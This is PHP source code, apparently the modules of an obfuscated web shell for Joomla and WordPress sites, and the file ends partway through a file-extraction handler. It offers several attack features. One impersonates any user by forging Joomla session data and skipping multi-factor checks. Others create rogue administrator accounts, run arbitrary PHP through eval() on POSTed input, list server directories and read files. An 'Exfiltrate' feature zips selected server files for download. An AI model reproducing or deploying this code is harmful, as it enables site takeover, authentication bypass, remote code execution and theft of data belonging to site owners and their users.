function yCTN(&$HRc_content, $HpEs, $HRc, $GnR) {
    $GIz = yjae();

    $HRc_content = yOWa(
        $HpEs,
        $HRc,
        $GnR,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            ymakeTable(
                "Users",
                "Joomla users to impersonate",
                $GIz,
                array(
                    "id"       => "Id",
                    "username" => "Username",
                    "email"    => "Email",
                    "title"    => "Role",
                    "actions"  => "Actions",
                ),
                "
                        <dialog id='create-joomla-user' class='p-4 rounded w-1/3'>" .
                yUQj(
                    $HRc,
                    $_SERVER["REQUEST_URI"],
                    array(
                        "<div class='flex items-center justify-between'>
                                        <h3 class='text-lg font-semibold text-zinc-800'>Create Joomla user</h3>
                                        <button onclick='document.getElementById(\"create-joomla-user\").close(); document.getElementById(\"create-joomla-user\").classList.remove(\"flex\")' 
                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                            &times;
                                        </button>
                                    </div>",
                        yvFX(
                            "text",
                            "Username",
                            "h39",
                            "admin",
                            "Username of the user to create.",
                            true
                        ),
                        yvFX(
                            "text",
                            "Email",
                            "A64",
                            "admin@example.com",
                            "Email of the user to create.",
                            true
                        ),
                        yvFX(
                            "password",
                            "Password",
                            "u43",
                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                            "Password of the user to create.",
                            true
                        ),
                    ),
                    "post",
                    "Create user",
                    "flex flex-col gap-y-6 mx-auto w-full"
                )
                . "
                        </dialog>
                        <button onclick='document.getElementById(\"create-joomla-user\").showModal()' 
                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                                hover:bg-zinc-700 transition-all duration-300'>
                            Create user
                        </button>"
            ),
        )
    );
}

/**
 * Create a Joomla user table row
 *
 * @param $ybQ array{id: int, username: string, email: string, title: string} The data of the Joomla user
 *
 * @return array{id: int, username: string, email: string, title: string, actions: string} The Joomla user table row
 */
function yWVF($ybQ) {
    global $yub;
    return array_merge(
        $ybQ,
        array(
            "actions" => yUQj(
                $yub,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "hidden",
                        "Username",
                        "s82",
                        "",
                        "Username of the user to impersonate.",
                        true,
                        null,
                        htmlentities($ybQ["username"])
                    ),
                ),
                "post",
                "Impersonate",
                "flex flex-col max-w-xl mb-0"
            ),
        )
    );
}

/**
 * Get the list of Joomla users
 *
 * @return array{id: int, username: string, email: string, title: string}[] List of Joomla users
 */
function yjae() {
    // inject joomla dependencies
    $Vcj = \Joomla\CMS\Factory::getContainer();
    $jPm = $Vcj->get("Joomla\Database\DatabaseInterface");

    // create a new query object to retrieve user details along with group names
    $cje = $jPm->getQuery(true);

    // build the query to retrieve user details and group names
    $cje->select(array('u.id', 'u.username', 'u.email', 'g.title'));
    $cje->from($jPm->quoteName('#__users', 'u'));
    $cje->leftJoin($jPm->quoteName('#__user_usergroup_map', 'm') . ' ON u.id = m.user_id');
    $cje->leftJoin($jPm->quoteName('#__usergroups', 'g') . ' ON m.group_id = g.id');

    // set the query conditions to retrieve only activated users:
    // $cje->where('u.block = 0');

    // execute the query
    $jPm->setQuery($cje);

    return array_map(
        "yWVF",
        $jPm->loadAssocList()
    );
}

/**
 * Handle the redirect of Joomla to the administration panel
 *
 * @return void
 */
function yQvW() {
    // Get the base URL of the Joomla site
    $dWl = JUri::base();

    // Construct the URL to the administration panel
    $Tro = $dWl . '../../../administrator/index.php';

    // Redirect to the administration panel
    JFactory::getApplication()
        ->redirect($Tro);
}

/**
 * Impersonate a Joomla user given a username
 *
 * @param $ELMname string The username of the user to impersonate
 *
 * @return void
 */
function yXTQ($ELMname) {
    // inject joomla dependencies
    $Vcj = \Joomla\CMS\Factory::getContainer();
    /**
     * @var \Joomla\Database\DatabaseDriver $jPm
     */
    $jPm = $Vcj->get("Joomla\Database\DatabaseInterface");

    // Get the user ID by username
    $cje = $jPm->getQuery(true)
        ->select('id')
        ->from('#__users')
        ->where('username = :username')
        ->bind(':username', $ELMname);

    $jPm->setQuery($cje);
    $Qdp = $jPm->loadResult();

    // Get the user object by id
    $ELM = $Vcj->get("Joomla\CMS\User\UserFactoryInterface")
        ->loadUserById($Qdp);

    // create a new registry object to store the session data
    $MUD = new \Joomla\Registry\Registry();

    // the registry must contain a session object (stdClass)
    $zux               = new \stdClass();
    $zux->token        = session_id();
    $zux->counter      = 5;
    $zux->timer        = new \stdClass();
    $zux->timer->start = time();
    $zux->timer->now   = time();
    $zux->timer->last  = time() + 60 * 60 * 24; // 24 hours
    // add the session object to the registry
    $MUD->set("session", $zux);

    // the registry must contain another registry object (i don't know why yet...)
    $_registry = new \Joomla\Registry\Registry();
    $MUD->set("registry", $_registry);

    // the registry must contain a user object (a full user object directly retrieved from the database)
    $MUD->set("user", $ELM);

    // if the user has MFA enabled, we need to bypass it, this should do the trick
    $UVr              = new \stdClass();
    $UVr->mfa_checked = 1;
    $MUD->set("com_users", $UVr);

    // serialize the registry object and encode it in base64
    $aOr = base64_encode(serialize($MUD));
    // then serialized the previous object and prepend it with the "joomla|" prefix
    $Uwb = "joomla|" . serialize($aOr);

    // update the session data in the database
    $BZu = 1;
    $IwK = 0;
    $cje = $jPm->getQuery(true)
        ->update('#__session')
        ->set('data = :data')
        ->set('client_id = :client_id')
        ->set('guest = :guest')
        ->set('time = :time')
        ->set('userid = :uid')
        ->where('session_id = :session_id')
        ->bind(':data', $Uwb)
        ->bind(':time', $zux->timer->now)
        ->bind(':uid', $ELM->id)
        ->bind(':client_id', $BZu)
        ->bind(':guest', $IwK)
        ->bind(":session_id", $zux->token);
    $jPm->setQuery($cje);
    $jPm->execute();

    // redirect to the admin panel (if located at the default path)
    yQvW();
}

/**
 * Add a Joomla super user
 *
 * @param $ELMname string The username of the super user
 * @param $IDs string The email of the super user
 * @param $YeY string The password of the super user
 *
 * @return void
 */
function yNKx($ELMname, $IDs, $YeY) {
    // inject joomla dependencies
    $Vcj = \Joomla\CMS\Factory::getContainer();
    /**
     * @var \Joomla\Database\DatabaseDriver $jPm
     */
    $jPm = $Vcj->get("Joomla\Database\DatabaseInterface");

    // Query to retrieve the group ID for Super Users
    $cje = $jPm->getQuery(true)
        ->select($jPm->quoteName('id'))
        ->from($jPm->quoteName('#__usergroups'))
        ->where($jPm->quoteName('title') . ' = ' . $jPm->quote('Super Users'));

    // Execute the query
    $jPm->setQuery($cje);
    $Hly = $jPm->loadResult();

    // hash the password
    $YeY = JUserHelper::hashPassword($YeY);

    // Insert the user into the #__users table
    $cje = $jPm->getQuery(true)
        ->insert($jPm->quoteName('#__users'))
        ->columns(
            array(
                $jPm->quoteName('name'),
                $jPm->quoteName('username'),
                $jPm->quoteName('email'),
                $jPm->quoteName('password'),
                $jPm->quoteName('params'),
                $jPm->quoteName('registerDate'),
                $jPm->quoteName('lastvisitDate'),
                $jPm->quoteName('lastResetTime'),
            )
        )
        ->values(
            $jPm->quote($ELMname) .
            ', ' .
            $jPm->quote($ELMname) .
            ', ' .
            $jPm->quote($IDs) .
            ', ' .
            $jPm->quote($YeY) .
            ', "", NOW(), NOW(), NOW()'
        );
    $jPm->setQuery($cje);
    $jPm->execute();

    // Get the user ID of the newly inserted user
    $ELMId = $jPm->insertid();

    // Insert user-group mapping into #__user_usergroup_map table
    $cje = $jPm->getQuery(true)
        ->insert($jPm->quoteName('#__user_usergroup_map'))
        ->columns(array($jPm->quoteName('user_id'), $jPm->quoteName('group_id')))
        ->values($ELMId . ', ' . $Hly);
    $jPm->setQuery($cje);
    $jPm->execute();
}

/**
 * Handle the login operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yMlu($VPY, $HpEs) {
    if (!empty($_POST["s82"])) {
        yXTQ($_POST["s82"]);
    }
    elseif (!empty($_POST["h39"]) &&
            !empty($_POST["A64"]) &&
            !empty($_POST["u43"])) {
        yNKx($_POST["h39"], $_POST["A64"], $_POST["u43"]);

        header(
            "Location: " .
            $_SERVER["REQUEST_URI"],
            true,
            301
        );
        die;
    }
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $xnBsolated_ops array The isolated operations container
 *
 * @return void
 */
function ywSZ(&$xnBsolated_ops) {
    global $yub;

    $xnBsolated_ops[] = $yub;
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yZph(&$HpEs) {
    global $yub;

    $HpEs[] = array(
        "title"       => "Impersonate Joomla user",
        "description" => "Impersonate a Joomla user by changing the current session.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
</svg>',
        "op"          => $yub,
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yBoc(&$HRc_content, $HpEs, $HRc, $GnR) {
    $GIz         = ymDd();
    $HRc_content = yOWa(
        $HpEs,
        $HRc,
        $GnR,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            ymakeTable(
                "Users",
                "WordPress users to impersonate",
                $GIz,
                array(
                    "user_login" => "Username",
                    "user_email" => "Email",
                    "roles"      => "Roles",
                    "user_url"   => "URL",
                    "actions"    => "Actions",
                ),
                "
                        <dialog id='create-wp-user' class='p-4 rounded w-1/3'>" .
                yUQj(
                    $HRc,
                    $_SERVER["REQUEST_URI"],
                    array(
                        "<div class='flex items-center justify-between'>
                                        <h3 class='text-lg font-semibold text-zinc-800'>Create WordPress user</h3>
                                        <button onclick='document.getElementById(\"create-wp-user\").close(); document.getElementById(\"create-wp-user\").classList.remove(\"flex\")' 
                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                            &times;
                                        </button>
                                    </div>",
                        yvFX(
                            "text",
                            "Username",
                            "h39",
                            "admin",
                            "Username of the user to create.",
                            true
                        ),
                        yvFX(
                            "password",
                            "Password",
                            "A64",
                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                            "Password of the user to create.",
                            true
                        ),
                    ),
                    "post",
                    "Create user",
                    "flex flex-col gap-y-6 mx-auto w-full"
                )
                . "
                        </dialog>
                        <button onclick='document.getElementById(\"create-wp-user\").showModal()' 
                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                                hover:bg-zinc-700 transition-all duration-300'>
                            Create user
                        </button>"
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function ywcQ($VPY, $HpEs) {
    // Run the impersonate operation
    if (!empty($_POST["s82"])) {
        $ELM = get_user_by("login", $_POST["s82"]);
        if ($ELM) {
            wp_set_current_user($ELM->ID, $ELM->user_login);
            wp_set_auth_cookie($ELM->ID);
            wp_redirect(site_url());
            die;
        }
    }
    // Run the user creation operation
    elseif (!empty($_POST["h39"]) &&
            !empty($_POST["A64"])) {
        // creates the admin user
        $ELM_id = wp_insert_user(
            array(
                "user_login" => "y" . $_POST["h39"],
                "user_pass"  => $_POST["A64"],
                "role"       => "administrator",
            )
        );

        // if the user was created successfully, log in
        if (!is_wp_error($ELM_id)) {
            $ELM = get_user_by("id", $ELM_id);
            if ($ELM) {
                wp_set_current_user($ELM->ID, $ELM->user_login);
                wp_set_auth_cookie($ELM->ID);
                wp_redirect(site_url());
                die;
            }
        }
    }
}

/**
 * Create the table row for the WordPress users
 *
 * @param $ybQ WP_User The WordPress user data
 *
 * @return array The table row
 */
function yzWD($ybQ) {
    global $tRi;

    return array_merge(
        (array) $ybQ->data,
        array(
            "roles"   => $ybQ->roles,
            "actions" => yUQj(
                $tRi,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "hidden",
                        "username",
                        "s82",
                        "",
                        "Username of the user to impersonate.",
                        true,
                        null,
                        htmlentities($ybQ->data->user_login)
                    ),
                ),
                "post",
                "Impersonate",
                "flex flex-col max-w-xl mb-0"
            ),
        )
    );
}

/**
 * Get the list of WordPress users
 *
 * @return array List of WordPress users
 */
function ymDd() {
    return array_map(
        "yzWD",
        get_users()
    );
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $xnBsolated_ops array The isolated operations container
 *
 * @return void
 */
function yadK(&$xnBsolated_ops) {
    global $tRi;

    $xnBsolated_ops[] = $tRi;
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yNwP(&$HpEs) {
    global $tRi;

    $HpEs[] = array(
        "title"       => "Impersonate WP user",
        "description" => "Impersonate a WordPress user by changing the current session.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
</svg>',
        "op"          => $tRi,
    );
}


/**
 * Create the code evaluation page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yIHc(&$HRc_content, $HpEs, $HRc, $GnR) {
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            yUQj(
                $HRc,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "textarea",
                        "PHP code",
                        "s82",
                        "echo 'Hello, world!';",
                        "The PHP code to evaluate.",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the code evaluation operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yxrz($VPY, $HpEs) {
    eval($_POST["s82"]);
}

/**
 * Hook the features to add the code evaluation feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function ylnX(&$HpEs) {
    global $VGK;

    $HpEs[] = array(
        "title"       => "Eval PHP",
        "description" => "Evaluate PHP code.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
</svg>',
        "op"          => $VGK,
    );
}


/**
 * Create the login page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function ykEC(&$HRc_content, $HpEs, $HRc, $GnR) {
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            yUQj(
                $HRc,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "text",
                        "Path",
                        "s82",
                        "C://path/to/directory or \\\\network\\path\\to\\directory",
                        "Fully qualified path to the directory to list.",
                        true
                    ),
                    yvFX(
                        "text",
                        "Depth",
                        "h39",
                        "5",
                        "How many levels deep to list, where " . ylJy(0) .
                        " is the current directory and " . ylJy("inf") .
                        " means to list all.",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the directory listing operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yOow($VPY, $HpEs) {
    $Hvp = strtolower($_POST['h39']) === "inf" ? INF : intval($_POST['h39']);

    ysZl($_POST['s82'], $Hvp);
}

/**
 * Get the permissions string for a file or directory (unix like `ls -l` output)
 *
 * @param $cVe string Path to get permissions for
 *
 * @return string
 */
function yTFV($cVe) {
    if (!file_exists($cVe)) {
        return "----------";
    }

    $GpU = fileperms($cVe);

    // Determine file type
    $qdq = '';
    if (is_dir($cVe)) {
        $qdq = 'd';
    }
    elseif (is_file($cVe)) {
        $qdq = '-';
    }

    // Owner permissions
    $CVJ = ($GpU & 0x0100) ? 'r' : '-';
    $CVJ .= ($GpU & 0x0080) ? 'w' : '-';
    $CVJ .= ($GpU & 0x0040) ? (($GpU & 0x0800) ? 's' : 'x') : (($GpU & 0x0800) ? 'S' : '-');

    // Group permissions
    $hen = ($GpU & 0x0020) ? 'r' : '-';
    $hen .= ($GpU & 0x0010) ? 'w' : '-';
    $hen .= ($GpU & 0x0008) ? (($GpU & 0x0400) ? 's' : 'x') : (($GpU & 0x0400) ? 'S' : '-');

    // Other permissions
    $rOj = ($GpU & 0x0004) ? 'r' : '-';
    $rOj .= ($GpU & 0x0002) ? 'w' : '-';
    $rOj .= ($GpU & 0x0001) ? (($GpU & 0x0200) ? 't' : 'x') : (($GpU & 0x0200) ? 'T' : '-');

    return $qdq . $CVJ . $hen . $rOj;
}

/**
 * Get the stat for the current path and print information
 *
 * @param $cVe string Path to get stat for
 *
 * @return array
 */
function yKQN($cVe) {
    $leB = stat($cVe);

    // Print information for current path
    $vpE = yTFV($cVe);

    // Output `ls -lah` like format
    echo "$vpE " .
         yQPw("" . $leB["nlink"], 3) .
         " " .
         yQPw("" . $leB["uid"], 5) . // always 0 on windows
         " " .
         yQPw("" . $leB["gid"], 5) . // always 0 on windows
         " " .
         yAVX($leB["size"]) .
         " " .
         yISu($leB["mtime"]) .
         " " . htmlentities($cVe) . PHP_EOL;

    return array($leB, $vpE);
}

/**
 * List files recursively
 *
 * @param $cVe string Path to list
 * @param $Hvp int Maximum depth to list
 * @param $DlD int Current depth
 * @param $YxH bool Whether to show a line split between entries
 *
 * @return void
 */
function ysZl($cVe, $Hvp, $DlD = 0, $YxH = true) {
    // Get stat for current path
    yKQN($cVe);

    if ($YxH) {
        echo "----------------\n";
    }

    // Check if path is a directory and is readable
    if (is_dir($cVe) && is_readable($cVe)) {

        // Open directory handle
        $sUE_handle = opendir($cVe);

        // Loop through directory contents
        while (($ynC = readdir($sUE_handle)) !== false) {

            // Ignore '.' and '..'
            if ($ynC !== '.' && $ynC !== '..') {
                $KOe = "$cVe/$ynC";

                // Recursively list files if depth is less than max depth
                if ($DlD < $Hvp) {
                    ysZl($KOe, $Hvp, $DlD + 1, false);
                }
                else {
                    // Print information for files beyond max depth
                    yKQN($KOe);
                }
            }
        }
        // Close directory handle
        closedir($sUE_handle);
    }
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yLPT(&$HpEs) {
    global $aXz;

    $HpEs[] = array(
        "title"       => "Directory listing",
        "description" => "List all files and folders in a directory and optionally its subdirectories.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
</svg>',
        "op"          => $aXz,
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yPIh(&$HRc_content, $HpEs, $HRc, $GnR) {
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            yUQj(
                $HRc,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "textarea",
                        "Paths",
                        "s82",
                        "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
                        "List of file/folders to include in the zip archive.<br/>" .
                        "Concatenate to the path " . ylJy(",with_tree") .
                        " to include all files and folders within a given directory.<br/>" .
                        "Concatenate to the path " . ylJy(",extensions=txt|doc|xlsx") .
                        " to include only files with the given extensions.",
                        true
                    ),
                )
            ),
            // if a request with the status parameter is received create the command output screen and render the status
            empty($_GET["status"])
                ? ""
                : ylqR(true) .
                  htmlentities($_GET["status"]) .
                  yPrI(true),
        )
    );
}

/**
 * Get the shortest common path from a list of paths
 *
 * @param $OWf string[] List of paths
 *
 * @return string|null
 */
function yeRX($OWf) {
    if (empty($OWf)) {
        return null;
    }

    // Initialize with first path
    $Urp = $OWf[0];

    foreach ($OWf as $cVe) {
        $Nii          = '';
        $cVe_segments = explode(DIRECTORY_SEPARATOR, trim($cVe, DIRECTORY_SEPARATOR)); // Split path by separator
        $rZn          = explode(DIRECTORY_SEPARATOR, trim($Urp, DIRECTORY_SEPARATOR));

        $KkS = min(count($cVe_segments), count($rZn));
        for ($xnB = 0; $xnB < $KkS; $xnB++) {
            if ($cVe_segments[$xnB] === $rZn[$xnB]) {
                $Nii .= $cVe_segments[$xnB] . DIRECTORY_SEPARATOR;
            }
            else {
                break;
            }
        }

        // Update shortest path if shorter common path found
        $Urp = $Nii;
    }

    // Remove trailing separator if present
    return rtrim($Urp, DIRECTORY_SEPARATOR);
}

/**
 * Add a directory to a zip archive
 *
 * @param $sUE string Directory to add
 * @param $dZl ZipArchive Zip archive to add to
 * @param $pQy bool Whether to add the directory recursively
 * @param $uOIs string[] Extensions to include
 * @param $oxq string Path to cleanup
 *
 * @return void
 */
function ynHe($sUE, $dZl, $pQy, $uOIs, $oxq = "") {
    $sUE_handle = opendir($sUE);

    while (($ynC = readdir($sUE_handle)) !== false) {
        if ($ynC !== '.' && $ynC !== '..') {
            $KOe = "$sUE/$ynC";

            if (
                is_file($KOe) &&
                ($uOIs === array() || in_array(strtolower(pathinfo($KOe, PATHINFO_EXTENSION)), $uOIs))
            ) {
                // Add with relative path within zip
                $dZl->addFile(
                    $KOe,
                    str_replace(
                        $oxq,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($KOe)
                        )  // Replace backslashes with forward slashes
                    ) // Remove common path from filename
                );
            }
            else {
                if ($pQy && is_dir($KOe) && is_readable($KOe)) {
                    ynHe($KOe, $dZl, $pQy, $uOIs, $oxq);
                }
            }
        }
    }

    closedir($sUE_handle);
}

/**
 * Handle the zip creation process
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yoLd($VPY, $HpEs) {
    $LGQ = $_POST['s82'];

    // ensure the zip extension is loaded
    if (!extension_loaded('zip')) {
        // redirect to the same page with the error status
        header(
            "Location: " . $_SERVER["REQUEST_URI"] .
            "&status=" .
            urlencode("Error: Zip extension is not loaded.")
        );
        return;
    }

    $dZl      = new ZipArchive();
    $dZl_name = tempnam(sys_get_temp_dir(), "K*8H7");

    // if the zip file cannot be opened fail
    if ($dZl->open($dZl_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        header(
            "Location: " . $_SERVER["REQUEST_URI"] .
            "&status=" .
            urlencode("Error: Could not create temporary archive.")
        );
        return;
    }

    $Bqzs            = explode("\n", $LGQ);
    $cVe_replacement = yeRX($Bqzs);

    // loop through the lines to extract
    foreach ($Bqzs as $Bqz) {
        // Split line by comma to extract options
        $xnBjV = explode(',', trim($Bqz));
        $cVe   = !empty($xnBjV[0]) ? $xnBjV[0] : '';

        // check if want to exfiltrate recursively
        $pQy  = in_array('with_tree', $xnBjV);
        $uOIs = array();

        // load the whitelisted extensions
        foreach ($xnBjV as $fxg) {
            if (strpos($fxg, 'extension=') === 0) {
                $uOIs = explode("|", strtolower(trim(substr($fxg, 10)))); // 10 = "extension=".length
                break;
            }
        }

        if ($cVe) {
            if (
                is_file($cVe) && // got a file
                // with a whitelisted extension (or extensions are not defined)
                ($uOIs === array() || in_array(strtolower(pathinfo($cVe, PATHINFO_EXTENSION)), $uOIs))
            ) {
                // add the file to the zip archive
                $dZl->addFile(
                    $cVe,
                    str_replace(
                        $cVe_replacement,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($cVe)
                        )  // Replace backslashes with forward slashes
                    ) // Remove common path from filename
                );
            }
            elseif (is_dir($cVe) && is_readable($cVe)) {
                ynHe(
                    $cVe,
                    $dZl,
                    $pQy,
                    $uOIs,
                    $cVe_replacement . DIRECTORY_SEPARATOR
                );
            }
        }
    }

    $dZl->close();

    $FIY = filesize($dZl_name);
    yDDm($dZl_name, $FIY, "export.zip");

    // Delete temporary zip file;
    unlink($dZl_name);
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $xnBsolated_ops array The isolated operations container
 *
 * @return void
 */
function ycIb(&$xnBsolated_ops) {
    global $NTp;

    $xnBsolated_ops[] = $NTp;
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yNQO(&$HpEs) {
    global $NTp;

    $HpEs[] = array(
        "title"       => "Exfiltrate",
        "description" => "Exfiltrate data from the server in a password protected zip archive.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
</svg>',
        "op"          => $NTp,
    );
}


/**
 * Make the file extraction page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yoCX(&$HRc_content, $HpEs, $HRc, $GnR) {
    global $Znu_PREVIEW, $Znu;
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            yUQj(
                $HRc,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "text",
                        "Path",
                        "s82",
                        "C://path/to/file.txt",
                        "Fully qualified path to the file to extract.",
                        true,
                        "M47"
                    ),
                    ypHp(
                        "h39",
                        "Preview",
                        "Display preview of the file content if it's larger than 100kb.",
                        $HRc === $Znu_PREVIEW,
                        "y",
                        $HRc === $Znu_PREVIEW
                            ? "window.location.href = '?page=" . urlencode($Znu) .
                              "&M47=' + encodeURIComponent(document.getElementById('s82').value)"
                            : "window.location.href = '?page=" . urlencode($Znu_PREVIEW) .
                              "&M47=' + encodeURIComponent(document.getElementById('s82').value)"
                    ),
                    ypHp(
                        "A64",
                        "Export",
                        "Export the file even if larger than 100kb."
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the file extraction operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function ygwI($VPY, $HpEs) {
    $ozK = $_POST['s82'];
    $NYx = strtolower($_POST['h39']) === "y";
    $Nia = strtolower($_POST['A64']) === "y";

    // sanitize the file path for display
    $vwB = htmlentities($ozK);

    // check if the file exists
    if (!file_exists($ozK)) {
        echo "Error: File '$vwB' does not exist.\n";
        return;
    }

    // get the file size
    $Mdj = filesize($ozK);

    // output some file information
    echo "Reading file '$vwB'\n";
    echo "File size: " . yAVX($Mdj) . "\n";

    // if preview is enabled, read the first 10Kb of the file
    if ($NYx) {
        $NYx_content = fopen($ozK, "r");
        $HFT         = fread($NYx_content, 10240); // Read 10Kb

        fclose($NYx_content);

        echo "Preview:\n" . htmlentities($HFT) . "\n";
        return;
    }

    // if the file is less than 100Kb, read the entire file
    if ($Mdj < 102400) { // Less than 100Kb
        yDDm($ozK, $Mdj);
    }
    // if export is enabled, read the entire file even if it's larger than 100Kb
    elseif ($Nia) {
        yDDm($ozK, $Mdj);
    }
